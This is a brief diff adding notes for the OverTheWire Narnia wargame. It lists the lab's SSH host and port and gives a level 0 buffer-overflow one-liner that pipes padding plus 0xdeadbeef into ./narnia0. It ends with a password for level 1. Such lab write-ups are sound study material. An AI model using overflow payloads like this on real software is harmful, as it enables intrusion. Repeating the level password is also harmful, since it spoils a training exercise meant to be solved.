@@ -1,0 +1,15 @@
+Narnia’s levels are called narnia0, narnia1, … etc.
+and can be accessed on
+narnia.labs.overthewire.org
+through SSH on port 2226.
+
+Level 0 :
+
+0xdeadbeef
+
+ (echo -e "12345678901234567890\xef\xbe\xad\xde"; cat;) | ./narnia0
+
+find -user narnia0 -type f
+cd /etc/narnia_pass
+Level 1 :
+Ppssword: efeidiedae
